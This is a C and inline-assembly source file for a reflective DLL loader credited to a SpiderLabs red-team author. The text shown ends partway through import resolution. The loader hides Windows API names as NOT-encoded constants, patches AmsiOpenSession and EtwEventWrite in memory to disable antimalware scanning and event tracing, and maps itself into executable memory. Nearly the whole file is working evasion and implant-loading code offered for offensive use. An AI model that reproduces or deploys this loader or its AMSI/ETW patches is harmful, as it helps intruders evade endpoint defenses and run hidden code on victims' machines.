// Author: Bobby Cooke (@0xBoku) // SpiderLabs // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
// Credits: Stephen Fewer (@stephenfewer) & SEKTOR7 Crew (@SEKTOR7net) https://institute.sektor7.net/
#include <windows.h>
#define BYPASS // ETW & AMSI bypass switch. Comment out this line to disable 
#ifdef BYPASS
typedef BOOL    (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
#endif

typedef BOOL    (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );
typedef HMODULE (WINAPI * tLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI * tGetProcAddress) (HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI * tVirtualAlloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef DWORD   (NTAPI * tNtFlushInstructionCache)( HANDLE ProcessHandle, PVOID BaseAddress, ULONG NumberOfBytesToFlush );
PVOID crawlLdrDllList(wchar_t *);
PVOID getExportDirectory(PVOID dllAddr);
PVOID getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getExportNameTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getNewExeHeader(PVOID dllBase);
PVOID getOptionalHeader(PVOID NewExeHeader);
PVOID getImportDirectory(PVOID OptionalHeader);
PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable);

__declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
{
	PVOID initRdllAddr;
	PVOID newRdllAddr;
	PVOID uiAddressArray;
	PVOID uiNameArray;
	PVOID importedDllExportDirectory;
	PVOID uiNameOrdinals;
	DWORD dwHashValue;
	PVOID newExeHeaderAddr;
	// NTDLL Variables
	PVOID ntdllAddr, ntdllExportDirectory, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable;
	char ntFlushStr[] = "f2.13f,,t41,.1-$#.15,$e";
	PVOID ntFlushStrLen = (PVOID)23;
	tNtFlushInstructionCache pNtFlushInstructionCache = NULL;
	// KERNEL32 Variables
	PVOID kernel32Addr, kernel32ExportDirectory, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable;

	char getProcAddrStr[] = "f#A@4!g.22y:23";
	PVOID getProcAddrStrLen = (PVOID)14;
	tGetProcAddress pGetProcAddress = NULL;

	char loadLibraryAStr[] = "3.1#$i-r3r,A";
	PVOID loadLibraryAStrLen = (PVOID)12;
	tLoadLibraryA pLoadLibraryA = NULL;
	
	char VirtualAllocStr[] = "3t,2ua46.5oc";
	PVOID VirtualAllocStrLen = (PVOID)12;
	tVirtualAlloc pVirtualAlloc = NULL;

	// STEP X: Resolve the addresses of NTDLL and Kernel32 from the Loader via GS>TEB>PEB>LDR>InMemoryOrderModuleList
	//   - This is done by matching the first 4 unicode charaters of the DLL BaseName
	char ntdlStr[] = "ntdl"; // L"ntdll.dll" - Only need the first 4 unicode bytes to find the DLL from the loader list
;
	ntdllAddr = (PVOID)crawlLdrDllList((PVOID)ntdlStr);
	ntdllExportDirectory = getExportDirectory(ntdllAddr);
	ntdllExAddrTable = getExportAddressTable(ntdllAddr, ntdllExportDirectory);
	ntdllExNamePointerTable = getExportNameTable(ntdllAddr, ntdllExportDirectory);
	ntdllExOrdinalTable = getExportOrdinalTable(ntdllAddr, ntdllExportDirectory);

	// NTDLL.NtFlushInstructionCache
	//char ntFlushStr[] = "NtFlushInstructionCache";
	// String length : 23
	__asm__(
		"mov rsi, %[ntFlushStr] \n"
		"mov rdx, 0xFF9A979C9EBC9190 \n" // NOT ehcaCno : 65686361436e6f
		"mov rcx, 0x968B9C8A8D8B8C91 \n" // NOT itcurtsn : 697463757274736e
		"mov rbx, 0xB6978C8A93B98BB1 \n" // NOT IhsulFtN : 496873756c46744e
		"not rdx \n"
		"not rcx \n"
		"not rbx \n"
		"mov [rsi], rbx \n"
		"mov [rsi+0x8], rcx \n"
		"mov [rsi+0x10], rdx \n"
		: // no output
		:[ntFlushStr] "r" (ntFlushStr)
	);
	pNtFlushInstructionCache = getSymbolAddress(ntFlushStr, ntFlushStrLen, ntdllAddr, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable);

	char kernstr[] = "KERN"; // L"KERNEL32.DLL" - Debugging shows that kernel32 loads in with all uppercase. May need to check for both in future 
	kernel32Addr = (PVOID)crawlLdrDllList((PVOID)kernstr);
	kernel32ExportDirectory = getExportDirectory(kernel32Addr);
	kernel32ExAddrTable = getExportAddressTable(kernel32Addr, kernel32ExportDirectory);
	kernel32ExNamePointerTable = getExportNameTable(kernel32Addr, kernel32ExportDirectory);
	kernel32ExOrdinalTable = getExportOrdinalTable(kernel32Addr, kernel32ExportDirectory);

	// String length : 14
	__asm__(
		"mov rsi, %[getProcAddrStr] \n"
		"mov rbx, 0xBE9C908DAF8B9AB8 \n" // NOT AcorPteG : 41636f7250746547
		"not rbx \n"
		"mov [rsi], rbx \n"
		"mov rdx, 0xFFFF8C8C9A8D9B9B \n" // NOT sserdd : 737365726464
		"not rdx \n"
		"mov [rsi+0x8], rdx \n"
		: // no output
		:[getProcAddrStr] "r" (getProcAddrStr)
	);
	pGetProcAddress = getSymbolAddress(getProcAddrStr, getProcAddrStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
	// char VirtualAllocStr[] = "VirtualAlloc";
	// String length : 12
	__asm__(
		"mov rsi, %[VirtualAllocStr] \n"
		"mov r8, 0xFFFFFFFF9C909393 \n" // NOT coll : 636f6c6c
		"mov rdx, 0xBE939E8A8B8D96A9 \n" // NOT AlautriV : 416c617574726956
		"not rdx \n"
		"not r8 \n"
		"mov [rsi], rdx \n"
		"mov [rsi+0x8], r8 \n"
		: // no output
		:[VirtualAllocStr] "r" (VirtualAllocStr)
	);
	pVirtualAlloc  = getSymbolAddress(VirtualAllocStr, VirtualAllocStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
	//char loadLibraryAStr[] = "LoadLibraryA";
	// String length : 12
	__asm__(
		"mov rsi, %[loadLibraryAStr] \n"
		"mov rdx, 0xFFFFFFFFBE868D9E \n" // NOT Ayra : 41797261
		"mov r11, 0x8D9D96B39B9E90B3 \n" // NOT rbiLdaoL : 7262694c64616f4c
		"not r11 \n"
		"not rdx \n"
		"mov [rsi], r11 \n"
		"mov [rsi+0x8], rdx \n"
		: // no output
		:[loadLibraryAStr] "r" (loadLibraryAStr)
	);
	pLoadLibraryA  = getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
	
	#ifdef BYPASS
	// AMSI.AmsiOpenSession Bypass
	char amsiStr[] = "f!@.24#.62#6.2#"; // have space in reserved bytes for null string terminator
	//char amsiStr[] = "amsi.dll12345678;
    // python reverse.py amsi.dll12345678
    // String length : 8
    //   lld.isma : 6c6c642e69736d61
	__asm__(
		"mov rsi, %[amsiStr] \n"
		"xor rdx, rdx \n"                // null string terminator
		"mov r11, 0x93939BD1968C929E \n" // NOT lld.isma : 6c6c642e69736d61
		"not r11 \n"
		"mov [rsi], r11 \n"
		"mov [rsi+0x8], rdx \n"
		: // no output
		:[amsiStr] "r" (amsiStr)
	);	
	//__debugbreak();
	PVOID amsiAddr = (PVOID)crawlLdrDllList((PVOID)amsiStr); // check if amsi.dll is already loaded into the process
	// If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
	if (amsiAddr == NULL){
		amsiAddr = (PVOID)pLoadLibraryA((LPCSTR)(amsiStr));
	}
	PVOID amsiExportDirectory    = getExportDirectory(amsiAddr);
	PVOID amsiExAddrTable        = getExportAddressTable(amsiAddr, amsiExportDirectory);
	PVOID amsiExNamePointerTable = getExportNameTable(amsiAddr, amsiExportDirectory);
	PVOID amsiExOrdinalTable     = getExportOrdinalTable(amsiAddr, amsiExportDirectory);
	// char AmsiOpenSession[] = "AmsiOpenSession";
	char AmsiOpenSessionStr[] = "1#.4t.-4/.2u$42";
	// python reverse.py AmsiOpenSession   <--- Python Script from Vivek / Pentester Academy SLAE64 course
	// String length : 15
	//   noisseS : 6e6f6973736553
	//   nepOismA : 6e65704f69736d41
	__asm__(
		"mov rsi, %[AmsiOpenSessionStr] \n"
		"mov r8,  0xFF9190968C8C9AAC \n" // NOT noisseS : 6e6f6973736553
		"mov rdx, 0x919A8FB0968C92BE \n" // NOT nepOismA : 6e65704f69736d41
		"not rdx \n"
		"not r8 \n"
		"mov [rsi], rdx \n"
		"mov [rsi+0x8], r8 \n"
		: // no output
		:[AmsiOpenSessionStr] "r" (AmsiOpenSessionStr)
	);
	PVOID AmsiOpenSessionStrLen = (PVOID)15;
	PVOID pAmsiOpenSession  = getSymbolAddress(AmsiOpenSessionStr, AmsiOpenSessionStrLen, amsiAddr, amsiExAddrTable, amsiExNamePointerTable, amsiExOrdinalTable);
	SIZE_T bytesWritten;
	unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
	char WriteProcessMemoryStr[] = "g90.-13#5@3.-t3;5#9-.[3";
    // $ python reverse.py WriteProcessMemory
    // String length : 18
    //   yr : 7972
    //   omeMssec : 6f6d654d73736563
    //   orPetirW : 6f72506574697257
	__asm__(
		"mov rsi, %[WriteProcessMemoryStr] \n"
		"mov rcx, 0xFFFFFFFFFFFF868D \n" // NOT yr       : 7972
		"mov rdx, 0x90929AB28C8C9A9C \n" // NOT omeMssec : 6f6d654d73736563
		"mov r11, 0x908DAF9A8B968DA8 \n" // NOT orPetirW : 6f72506574697257
		"not rcx \n"
		"not r11 \n"
		"not rdx \n"
		"mov [rsi], r11 \n"
		"mov [rsi+0x8], rdx \n"
		"mov [rsi+0x10], rcx \n"
		: // no output
		:[WriteProcessMemoryStr] "r" (WriteProcessMemoryStr)
	);	
	tWriteProcessMemory pWriteProcessMemory = getSymbolAddress(WriteProcessMemoryStr, (PVOID)18, kernel32Addr, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
	pWriteProcessMemory((PVOID)-1, pAmsiOpenSession, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
	// ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
	char EtwEventWriteStr[] = "f9#.^124.-.32";
    // python reverse.py EtwEventWrite
    // String length : 13
    //   etirW    : 6574697257
    //   tnevEwtE : 746e657645777445
	__asm__(
		"mov rsi, %[EtwEventWriteStr] \n"
		"mov r8,  0xFFFFFF9A8B968DA8 \n" // NOT etirW    : 6574697257
		"mov rdx, 0x8B919A89BA888BBA \n" // NOT tnevEwtE : 746e657645777445
		"not rdx \n"
		"not r8 \n"
		"mov [rsi], rdx \n"
		"mov [rsi+0x8], r8 \n"
		: // no output
		:[EtwEventWriteStr] "r" (EtwEventWriteStr)
	);
	PVOID EtwEventWriteStrLen = (PVOID)13;
	PVOID pEtwEventWrite  = getSymbolAddress(EtwEventWriteStr, EtwEventWriteStrLen, ntdllAddr, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable);
	unsigned char etwbypass[] = { 0xc3 }; // ret
	pWriteProcessMemory((PVOID)-1, pEtwEventWrite, (PVOID)etwbypass, sizeof(etwbypass), &bytesWritten);
	#endif

	// Find ourselves in memory by searching for "MZ" 
	__asm__(
		"call pop \n"       // Calling the next instruction puts RIP address on the top of our stack
		"pop: \n"
		"pop rax \n"        // pop dat RIP into RAX
		"xor rbx,rbx \n"    // Clear out RBX - were gonna use it for comparing if we are at start
		"mov ebx,0x5A4D \n" // "MZ" bytes for comparing if we are at the start of our reflective DLL
		"or ax,0xFFF \n"    // This with +1 will align us to a memory page.
		"inc ax \n"
	"decPage:"
		"sub eax,0x1000 \n"           // move down a full memory page
		"cmp bx,word ptr ds:[rax] \n" // Compare the first 2 bytes of the page to "MZ"
		"jne decPage \n"              // if we found "MZ" end, else check next page
		"mov %[initRdllAddr], rax \n"
		:[initRdllAddr] "=r" (initRdllAddr)
	);

	// STEP 2 | Get size of our RDLL image, allocate memory for our new RDLL, and copy/write the headers from init RDLL to new RDLL
	// get the VA of the NT Header for the PE to be loaded
	newExeHeaderAddr = getNewExeHeader(initRdllAddr);
	// Get the size of our entire RDLL
	PVOID rdllSize;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax+0x50] \n" // EBX = ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
		"mov %[rdllSize], rbx \n"
		:[rdllSize] "=r" (rdllSize)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)	
	);

	// Allocate new memory to write our new RDLL too
	newRdllAddr = (PVOID)pVirtualAlloc( NULL, (SIZE_T)rdllSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// Get SizeOfHeaders
	PVOID SizeOfHeaders;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov %[SizeOfHeaders], [rax+0x54] \n" // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
		:[SizeOfHeaders] "=r" (SizeOfHeaders)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)	
	);
	// Write Headers from init RDLL to new RDLL
	__asm__(
		"mov rax, %[SizeOfHeaders] \n"
		"mov rsi, %[initRdllAddr] \n"
		"mov rdi, %[newRdllAddr] \n"
	"writeLooper: \n"
		"dec eax \n"           // Decrement the counter
		"xor rbx, rbx \n"
		"mov bl, [rsi]  \n"    // Load the next byte to write into the BL register
		"mov [rdi], bl \n"     // write the byte to newRdllAddr
		"inc rsi \n"           // move RSI to next bye of initRdllAddr 
		"inc rdi \n"           // move RDI to next bye of newRdllAddr 
		"test rax, rax \n"     // check if rax = 0
		"jne writeLooper \n"   // if rax != 0, then write next byte via loop
		:  // No outputs
		:[SizeOfHeaders] "r" (SizeOfHeaders),
		 [initRdllAddr] "r" (initRdllAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);

	// STEP 3 | Copy/write the sections from init RDLL to new RDLL
// RdllNthSectionAddr = the VA of the first section
// RdllNthSectionAddr = ( (PVOID)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );
	// Get the Optional Header Address
	// (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader
	PVOID OptionalHeaderAddr;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"add rax, 0x18 \n"
		"mov %[OptionalHeaderAddr], rax \n"
		:[OptionalHeaderAddr] "=r" (OptionalHeaderAddr)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)
	);
	// Get the Size of the Optional Header from the File Header of our Reflective DLL
	//((PIMAGE_NT_HEADERS)newExeHeaderAddr)->FileHeader.SizeOfOptionalHeader;
	PVOID SizeOfOptionalHeader;
		__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"add rax, 0x14 \n"  // RAX = &FileHeader.SizeOfOptionalHeader
		"xor rbx, rbx \n"
		"mov bx, [rax] \n"  // RBX = Value of FileHeader.SizeOfOptionalHeader
		"mov %[SizeOfOptionalHeader], rbx \n"
		:[SizeOfOptionalHeader] "=r" (SizeOfOptionalHeader)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)
	);
	// &[OptionalHeaderAddr+SizeOfOptionalHeader] = Virtual Address of the first section
	// (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader + ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->FileHeader.SizeOfOptionalHeader )
	PVOID RdllNthSectionAddr;
		__asm__(
		"mov rax, %[OptionalHeaderAddr] \n"
		"mov rbx, %[SizeOfOptionalHeader] \n"
		"add rax, rbx \n"
		"mov %[RdllNthSectionAddr], rax \n"
		:[RdllNthSectionAddr] "=r" (RdllNthSectionAddr)
		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr),
		 [SizeOfOptionalHeader] "r" (SizeOfOptionalHeader)
	);
// END of finding RdllNthSectionAddr

	// itterate through all sections, loading them into memory.
	// ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->FileHeader.NumberOfSections;
	PVOID NumberOfSections;
	__asm__(
		"mov rax, %[newExeHeaderAddr] \n"
		"add rax, 0x6 \n"  // RAX = &FileHeader.NumberOfSections
		"xor rbx, rbx \n"
		"mov bx, [rax] \n"
		"mov %[NumberOfSections], rbx \n"  // Value of FileHeader.NumberOfSections
		:[NumberOfSections] "=r" (NumberOfSections)
		:[newExeHeaderAddr] "r" (newExeHeaderAddr)
	);

	PVOID SectionRelativeVirtualAddress;
	PVOID newRdllSectionVirtualAddress;
	PVOID RVASectionPointerToRawData;
	PVOID InitRdllSectionVirtualAddress;
	PVOID SizeOfSection;

	while( NumberOfSections-- )
	{
		// STEP 3.1 | Get the source destination for the section
		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress = DWORD [RdllNthSectionAddr+0xC]
		// .text = SectionRelativeVirtualAddress = 191000 | 190000 = &newRdllAddr | 1000 = VirtualAddress
		//SectionRelativeVirtualAddress = ( newRdllAddr + ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress );
		// SectionRelativeVirtualAddress = (PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->VirtualAddress
		__asm__(
			"mov rax, %[RdllNthSectionAddr] \n"
			"add rax, 0xC \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"
			"mov %[SectionRelativeVirtualAddress], rbx \n"
			:[SectionRelativeVirtualAddress] "=r" (SectionRelativeVirtualAddress)
			:[RdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
		// newRdllSectionVirtualAddress = newRdllAddr + SectionRelativeVirtualAddress
		__asm__(
			"mov rax, %[newRdllAddr] \n"
			"mov rbx, %[SectionRelativeVirtualAddress] \n"
			"add rbx, rax \n"
			"mov %[newRdllSectionVirtualAddress], rbx \n"
			:[newRdllSectionVirtualAddress] "=r" (newRdllSectionVirtualAddress)
			:[newRdllAddr] "r" (newRdllAddr),
			[SectionRelativeVirtualAddress] "r" (SectionRelativeVirtualAddress)
		);	

		// STEP 3.2 | Get the destination memory address to write the section too
		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData = DWORD [RdllNthSectionAddr+0x14]
		// .text = InitRdllSectionVirtualAddress = 140400 | 140000 = &newRdllAddr | 400 = PointerToRawData
		// InitRdllSectionVirtualAddress = ( initRdllAddr + ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData );
		// (PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->PointerToRawData
		__asm__(
			"mov rax, %[RdllNthSectionAddr] \n"
			"add rax, 0x14 \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"
			"mov %[RVASectionPointerToRawData], rbx \n"
			:[RVASectionPointerToRawData] "=r" (RVASectionPointerToRawData)
			:[RdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
		// InitRdllSectionVirtualAddress = initRdllAddr + RVASectionPointerToRawData
		__asm__(
			"mov rax, %[initRdllAddr] \n"
			"mov rbx, %[RVASectionPointerToRawData] \n"
			"add rbx, rax \n"
			"mov %[InitRdllSectionVirtualAddress], rbx \n"
			:[InitRdllSectionVirtualAddress] "=r" (InitRdllSectionVirtualAddress)
			:[initRdllAddr] "r" (initRdllAddr),
			[RVASectionPointerToRawData] "r" (RVASectionPointerToRawData)
		);	
		// STEP 3.3 | Get the size of the section
		// ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->SizeOfRawData = DWORD [RdllNthSectionAddr+0x10]
		// SizeOfSection = ((PIMAGE_SECTION_HEADER)RdllNthSectionAddr)->SizeOfRawData
		__asm__(
			"mov rax, %[RdllNthSectionAddr] \n"
			"add rax, 0x10 \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"
			"mov %[SizeOfSection], rbx \n"
			:[SizeOfSection] "=r" (SizeOfSection)
			:[RdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
		// STEP 3.4 | Copy the section from the source address to the destination for the size of the section
		//while( SizeOfSection-- )
		//	*(BYTE *)newRdllSectionVirtualAddress++ = *(BYTE *)InitRdllSectionVirtualAddress++;
		// Write/Copy the section to the newRdll Adress memory
		__asm__(
			"mov rax, %[SizeOfSection] \n"
			"mov rsi, %[InitRdllSectionVirtualAddress] \n"
			"mov rdi, %[newRdllSectionVirtualAddress] \n"
		"writeLooper2: \n"
			"dec eax \n"           // Decrement the counter
			"xor rbx, rbx \n"
			"mov bl, [rsi]  \n"    // Load the next byte to write into the BL register
			"mov [rdi], bl \n"     // write the byte to newRdllSectionVirtualAddress
			"inc rsi \n"           // move RSI to next bye of InitRdllSectionVirtualAddress 
			"inc rdi \n"           // move RDI to next bye of newRdllSectionVirtualAddress 
			"test rax, rax \n"     // check if rax = 0
			"jne writeLooper2 \n"   // if rax != 0, then write next byte via loop
			:  // No outputs
			:[SizeOfSection] "r" (SizeOfSection),
			[InitRdllSectionVirtualAddress] "r" (InitRdllSectionVirtualAddress),
			[newRdllSectionVirtualAddress] "r" (newRdllSectionVirtualAddress)
		);
		// STEP 3.5 | Get the address of the next section header and loop until there are no more sections
		//RdllNthSectionAddr += sizeof( IMAGE_SECTION_HEADER );
		__asm__(
			"mov rax, %[InRdllNthSectionAddr] \n"
			"add rax, 0x28 \n" // sizeof( IMAGE_SECTION_HEADER ) = 0x28
			"mov %[OutRdllNthSectionAddr], rax \n"
			:[OutRdllNthSectionAddr] "=r" (RdllNthSectionAddr)
			:[InRdllNthSectionAddr] "r" (RdllNthSectionAddr)
		);
	}

// STEP 4: process our images import table

	// STEP 4.1 | Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
	// rdllDataDirImportDirectoryAddr = (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
	PVOID rdllDataDirImportDirectoryAddr;
	__asm__(
		"mov rax, %[OptionalHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x78 \n"
		"add rax, rbx \n"
		"mov %[rdllDataDirImportDirectoryAddr], rax \n"
		:[rdllDataDirImportDirectoryAddr] "=r" (rdllDataDirImportDirectoryAddr)
		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr)
	);
	// STEP 4.2 | Get the Address of the Import Directory from the Data Directory
//     typedef struct _IMAGE_DATA_DIRECTORY {
//       DWORD VirtualAddress;
//       DWORD Size;
//     } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;
	//  rdllImportDirectoryAddr = newRdllAddr + ((PIMAGE_DATA_DIRECTORY)rdllDataDirImportDirectoryAddr)->VirtualAddress 
	PVOID rdllImportDirectoryAddr;
	__asm__(
		"mov rax, %[rdllDataDirImportDirectoryAddr] \n"
		"mov rdx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax] \n"  // EBX = RVA of Import Directory
		"add rdx, rbx \n" // Import Directory of New RDLL = RVA of Import Directory + New RDLL Base Address
		"mov %[rdllImportDirectoryAddr], rdx \n"
		:[rdllImportDirectoryAddr] "=r" (rdllImportDirectoryAddr)
		:[rdllDataDirImportDirectoryAddr] "r" (rdllDataDirImportDirectoryAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);

	PVOID ImportedDllAddr;
	PVOID nextModuleImportDescriptor = rdllImportDirectoryAddr;
	PVOID importedDllExportAddressTable;
	PVOID importedDllExportNameTable;
	PVOID importedDllExportOrdinalTable;
	PVOID importEntryHint;
	PVOID importedDllBaseOrdinal; 
	PVOID importEntryExportTableIndex; 
	PVOID importEntryAddressRVA; 
	PVOID importEntryAddress; 


	PVOID importNameRVA;
	PVOID importName;
	__asm__(
		"mov rax, %[nextModuleImportDescriptor] \n"
		"mov r11, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"xor r12, r12 \n"
		"add rax, 0xC \n" 	     // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
		"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
		"push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
		"pop r12 \n"             // R12&RBX = RVA of Name DLL
		"cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
		"je check1 \n"
		"add rbx, r11 \n" 		 // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
		"check1: \n"
		"mov %[importNameRVA], r12 \n" 
		"mov %[importName], rbx \n" 
		:[importNameRVA] "=r" (importNameRVA),
	  	 [importName] "=r" (importName)
		:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
		 [newRdllAddr] "r" (newRdllAddr)
	);
	// Import all the symbols from all the import tables listed in the import directory
	PVOID importLookupTableEntry;
	PVOID importAddressTableEntry;
	PVOID importEntryNameString;
	PVOID importEntryNameStringLength;
	PVOID importEntryFunctionAddress;
	PVOID checkNullImportAddressTableEntry;
	// The last entry in the image import directory is all zeros
	//while( ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name )
	while(importNameRVA)
	{
		ImportedDllAddr = (PVOID)crawlLdrDllList(importName);
		// If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
		if (ImportedDllAddr == NULL){
			ImportedDllAddr = (PVOID)pLoadLibraryA( (LPCSTR)( importName ));
		}
		// importLookupTableEntry = VA of the OriginalFirstThunk
		//importLookupTableEntry = ( newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk );
		__asm__(
			"mov rax, %[nextModuleImportDescriptor] \n" // 0 byte offset is the address of the DWORD OriginalFirstThunk within the image import descriptor
			"mov r11, %[newRdllAddr] \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
			"add rbx, r11 \n" 		 // importLookupTableEntry = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk 
			"mov %[importLookupTableEntry], rbx \n" 
			:[importLookupTableEntry] "=r" (importLookupTableEntry)
			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
			 [newRdllAddr] "r" (newRdllAddr)
		);

		// importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
		//importAddressTableEntry = ( newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk );
		__asm__(
			"mov rax, %[nextModuleImportDescriptor] \n" 
			"mov r11, %[newRdllAddr] \n"
			"xor rbx, rbx \n"
			"add rax, 0x10 \n" 	     // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descripto
			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
			"add rbx, r11 \n" 		 // importAddressTableEntry = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk 
			"mov %[importAddressTableEntry], rbx \n" 
			:[importAddressTableEntry] "=r" (importAddressTableEntry)
			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
			 [newRdllAddr] "r" (newRdllAddr)
		);
		__asm__(
			"mov rax, %[importAddressTableEntry] \n" 
			"mov rax, [rax] \n"
			"mov %[checkNullImportAddressTableEntry], rax \n" 
			:[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
			:[importAddressTableEntry] "r" (importAddressTableEntry)
		);
		// itterate through all imported functions, importing by ordinal if no name present
		while(checkNullImportAddressTableEntry)
		{
			// Export Directory for current module/DLL being imported
			importedDllExportDirectory = getExportDirectory(ImportedDllAddr);
			// Export Address Table address for the current module being imported
			importedDllExportAddressTable = getExportAddressTable(ImportedDllAddr, importedDllExportDirectory);
			// Export AddressOfNames Table address for the current module being imported
			importedDllExportNameTable = getExportNameTable(ImportedDllAddr, importedDllExportDirectory);
			// Export AddressOfNameOrdinals Table address for the current module being imported
			importedDllExportOrdinalTable = getExportOrdinalTable(ImportedDllAddr, importedDllExportDirectory);

			if( importLookupTableEntry && ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
			{
				// STEP 3 | Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
				//   This is located in the Export Directory in memory of the module which functions/api's are being imported
				// importedDllBaseOrdinal = ((PIMAGE_EXPORT_DIRECTORY )importedDllExportDirectory)->Base;
				__asm__(
					"mov rcx, %[importedDllExportDirectory] \n"
					"xor rax, rax \n"
					"add rcx, 0x10 \n"         // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
					"mov eax, [rcx] \n"        // RAX = importedDllBaseOrdinal (Value/DWORD)
					"mov %[importedDllBaseOrdinal], rax \n"
					:[importedDllBaseOrdinal] "=r" (importedDllBaseOrdinal)
					:[importedDllExportDirectory] "r" (importedDllExportDirectory)
				);
